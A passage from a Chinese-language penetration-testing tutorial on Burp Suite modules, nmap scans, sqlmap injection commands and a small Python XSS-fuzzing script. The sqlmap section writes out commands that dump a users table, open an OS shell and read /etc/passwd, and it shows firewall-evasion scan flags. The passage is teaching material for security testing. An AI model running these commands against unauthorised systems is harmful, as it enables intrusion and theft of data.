# 渗透测试工具链

### 5.1 Burp Suite高级使用

Burp Suite是Web渗透测试的核心工具，其各模块的高阶用法：

**Proxy模块**：
- 请求拦截和修改：实时修改请求参数、头部、Body。
- 响应修改：修改服务器响应内容测试客户端行为。
- 请求历史：记录所有流量，便于回溯分析。

**Intruder模块**：
- Sniper模式：单个payload列表依次替换一个变量。
- Battering Ram模式：单个payload列表同时替换多个变量。
- Pitchfork模式：多个payload列表并行替换多个变量。
- Cluster Bomb模式：多个payload列表的全组合。
- Payload类型：简单列表、数字序列、日期、自定义载荷、运行时文件。
- 应用场景：暴力破解、参数枚举、SQL注入payload批量测试。

**Repeater模块**：
- 手动修改和重发请求。
- 支持修改HTTP方法、路径、头部、Body。
- 响应渲染：支持原始、HTML、JSON、Hex视图。
- 适合深度手动测试和漏洞验证。

**Scanner模块**（Pro版）：
- 主动扫描：自动发现Web漏洞（SQL注入、XSS、SSRF等）。
- 被动扫描：基于代理流量分析漏洞。
- 爬虫：自动发现应用页面和功能点。
- 漏洞分类和风险评级。

**Extender模块**：
- BApp Store安装社区扩展。
- 常用扩展：
  - Autorize：自动化越权检测。
  - Logger++：增强日志和过滤。
  - JWT Editor：JWT令牌编辑和解码。
  - Active Scan++：增强扫描规则。
  - JSON Web Token Burp Extension：JWT处理。

### 5.2 Nmap深度扫描技巧

```bash
# 全端口TCP SYN扫描
nmap -p- -sS -T4 --min-rate 1000 target

# 服务版本+默认脚本扫描
nmap -sV -sC -p- target

# 操作系统识别
nmap -O --osscan-guess target

# UDP端口扫描（Top 1000）
nmap -sU --top-ports 1000 target

# 防火墙绕过：分片包
nmap -f -sS target

# 特定脚本扫描
nmap --script smb-vuln* -p 445 target          # SMB漏洞
nmap --script http-enum -p 80,443 target        # Web目录枚举
nmap --script ssl-cert,ssl-enum-ciphers -p 443 target  # SSL证书和密码套件
nmap --script vuln target                       # 综合漏洞扫描

# 输出格式
nmap -oA scan_results target    # 同时输出XML、grepable、文本格式
```

### 5.3 sqlmap自动化注入

```bash
# 基础检测
sqlmap -u "http://target.com/page?id=1" --batch

# 指定注入参数
sqlmap -u "http://target.com/page?id=1&name=test" -p id --batch

# POST请求注入
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" -p user --batch

# 使用Burp请求文件
sqlmap -r request.txt --batch

# 获取数据库信息
sqlmap -u "http://target.com/page?id=1" --dbs          # 列出数据库
sqlmap -u "http://target.com/page?id=1" -D dbname --tables  # 列出表
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns  # 列出列
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump  # 导出数据

# 高级选项
--level=5 --risk=3    # 提高检测级别和风险等级
--tamper="space2comment,between"  # 使用绕过脚本
--os-shell           # 获取操作系统Shell（需DBA权限）
--file-read="/etc/passwd"  # 读取文件
--technique=BEUSTQ   # 指定注入技术
--threads=5          # 多线程
--second-url="http://target.com/result"  # 二阶注入
```

### 5.5 自定义工具开发

渗透测试中常需要定制化工具解决特定问题：

**Python脚本示例——批量URL参数Fuzzing**：
```python
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

def check_xss(url, param, payload):
    target = f"{url}?{param}={payload}"
    try:
        r = requests.get(target, timeout=5)
        if payload in r.text:
            print(f"[!] Possible XSS: {target}")
            return True
    except:
        pass
    return False

def main():
    url = sys.argv[1]
    param = sys.argv[2]
    payloads = open('xss_payloads.txt').read().splitlines()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_xss, url, param, p) for p in payloads]
        for f in futures:
            f.result()

if __name__ == '__main__':
    main()
```

**Burp Suite插件开发**：使用Java或Python（Jython）开发Burp扩展，自定义检测逻辑、自动化测试流程或与外部工具集成。
